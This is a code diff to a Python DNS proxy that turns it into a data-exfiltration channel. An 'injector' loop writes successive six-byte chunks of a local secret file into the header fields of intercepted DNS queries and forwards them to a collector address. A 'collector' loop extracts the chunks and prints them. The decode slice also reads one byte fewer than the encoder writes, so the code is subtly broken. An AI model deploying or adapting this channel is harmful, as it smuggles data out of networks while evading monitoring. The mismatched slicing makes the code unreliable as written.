@@ -6,9 +6,10 @@ import os
 
 n_times_6_bytes = 0
 secret_bytes: bytes
+collector_ip = '1.1.1.1'  # FIXME
 
 
-def receiveData(udps):
+def receive_data(udps):
     types = {1: "A", 2: "NS", 15: "MX", 16: "TXT", 28: "AAAA"}
     data, addr = udps.recvfrom(1024)
     dnsD = dnslib.DNSRecord.parse(data)
@@ -25,19 +26,30 @@ def receiveData(udps):
     return data, addr, type, domain, answer
 
 
-def forwarded_dns_request(data):
-    DNS_IP = "8.8.8.8"
-    print("Forwarding DNS request to " + DNS_IP)
+def forward_dns_request(data, next_dns_address="1.1.1.1"):
+    print("Forwarding DNS request to " + next_dns_address)
+    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    udps.sendto(data, (next_dns_address, 53))
+    data, addr = udps.recvfrom(1024)
+
+    return data
+
+
+def encode_data(data):
     secret = get_next_6_bytes_of_text()
     print(secret)
     print(data)
     data = data[0:6] + secret + data[12:]
     print(data)
-    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    udps.sendto(data, (DNS_IP, 53))
-    data, addr = udps.recvfrom(1024)
-
     return data
+
+
+def decode_data(data):
+    secret = data[7:12]
+    print(secret)
+    padding: bytes = b'\x00' * 6
+    data = data[0:6] + padding + data[12:]
+    return data, secret
 
 
 def load_secret_text_to_mem() -> bytes:
@@ -59,10 +71,20 @@ def get_next_6_bytes_of_text() -> bytes:
     return result
 
 
-def main_loop(udps):
+def main_injector_loop(udps):
     while True:
-        data, addr, type, domain, answer = receiveData(udps)
-        answer = forwarded_dns_request(data)
+        data, addr, type, domain, answer = receive_data(udps)
+        data = encode_data(data)
+        answer = forward_dns_request(data, collector_ip)
+        udps.sendto(answer, addr)
+
+
+def main_collector_loop(udps):
+    while True:
+        data, addr, type, domain, answer = receive_data(udps)
+        data, secret = decode_data(data)
+        print(secret)
+        answer = forward_dns_request(data, '1.1.1.1')
         udps.sendto(answer, addr)
 
 
@@ -94,7 +116,7 @@ def main():
     udps = init_listener()
     drop_privileges()
     try:
-        main_loop(udps)
+        main_injector_loop(udps)
     except KeyboardInterrupt:
         exit(0)
 
